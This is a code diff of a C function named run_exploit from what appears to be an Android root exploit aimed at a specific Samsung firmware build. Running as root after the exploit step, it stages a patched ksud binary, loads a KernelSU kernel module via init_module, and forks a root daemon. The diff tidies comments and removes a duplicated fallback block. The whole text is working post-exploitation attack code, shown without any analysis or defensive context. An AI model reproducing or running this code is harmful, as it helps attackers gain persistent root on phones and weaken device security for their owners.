@@ -615,10 +615,9 @@ int run_exploit(int argc, char **argv) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d\n", keeper);
 
-    /* Stage ksud at the path the Samsung module expects */
+    /* Stage ksud */
     int fd_src = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud-patched", O_RDONLY, 0);
     if (fd_src >= 0) {
-        /* Use .ksud-stage as temp name, then rename to ksud on same fs */
         int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/.ksud-stage",
                              O_WRONLY | O_CREAT | O_TRUNC, 0755);
         if (fd_dst >= 0) {
@@ -633,8 +632,6 @@ int run_exploit(int argc, char **argv) {
                 }
             }
             syscall(SYS_close, fd_dst);
-            
-            /* Rename on same filesystem - atomic */
             syscall(SYS_renameat, AT_FDCWD, "/data/local/tmp/.ksud-stage",
                     AT_FDCWD, "/data/local/tmp/ksud");
             pr_success("staged /data/local/tmp/ksud\n");
@@ -642,22 +639,20 @@ int run_exploit(int argc, char **argv) {
         syscall(SYS_close, fd_src);
     }
 
-    /* Load the KernelSU module directly from THIS root process */
-    fd_src = syscall(SYS_openat, AT_FDCWD,
+    /* Load module directly from this root process */
+    int fd_ko = syscall(SYS_openat, AT_FDCWD,
         "/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
         O_RDONLY, 0);
-    if (fd_src >= 0) {
-        /* init_module from the root exploit process */
-        int ret = syscall(SYS_init_module, fd_src, "", NULL);
+    if (fd_ko >= 0) {
+        int ret = syscall(SYS_init_module, fd_ko, "", NULL);
         pr_success("init_module ret=%d errno=%d\n", ret, errno);
-        syscall(SYS_close, fd_src);
-        
+        syscall(SYS_close, fd_ko);
+
         if (ret == 0) {
-            /* Module loaded successfully - now start the daemon */
+            /* Start daemon */
             pid_t daemon_pid = fork();
             if (daemon_pid == 0) {
                 setsid();
-                /* Redirect stdout/stderr to a log file so we can see daemon errors */
                 int log_fd = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud.log",
                                      O_WRONLY | O_CREAT | O_TRUNC, 0644);
                 if (log_fd >= 0) {
@@ -665,7 +660,6 @@ int run_exploit(int argc, char **argv) {
                     syscall(SYS_dup3, log_fd, 2, 0);
                     syscall(SYS_close, log_fd);
                 }
-                
                 char *args[] = {"/data/local/tmp/ksud", "daemon", NULL};
                 char *envp[] = {NULL};
                 syscall(SYS_execve, "/data/local/tmp/ksud", args, envp);
@@ -679,27 +673,6 @@ int run_exploit(int argc, char **argv) {
         }
     } else {
         pr_error("failed to open .ko errno=%d\n", errno);
-      /* Load module directly */
-    int fd_ko = syscall(SYS_openat, AT_FDCWD,
-        "/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
-        O_RDONLY, 0);
-    if (fd_ko >= 0) {
-        int ret = syscall(SYS_init_module, fd_ko, "", NULL);
-        pr_success("init_module ret=%d errno=%d\n", ret, errno);
-        syscall(SYS_close, fd_ko);
-        
-        if (ret == 0) {
-            /* Start su_daemon as the root helper */
-            pid_t daemon_pid = fork();
-            if (daemon_pid == 0) {
-                setsid();
-                char *args[] = {"/data/local/tmp/ksud-patched", "--daemon", NULL};
-                char *envp[] = {NULL};
-                syscall(SYS_execve, "/data/local/tmp/ksud-patched", args, envp);
-                syscall(SYS_exit, 1);
-            }
-        }
-    }
     }
 }
   return exploit_ok ? 0 : 1;
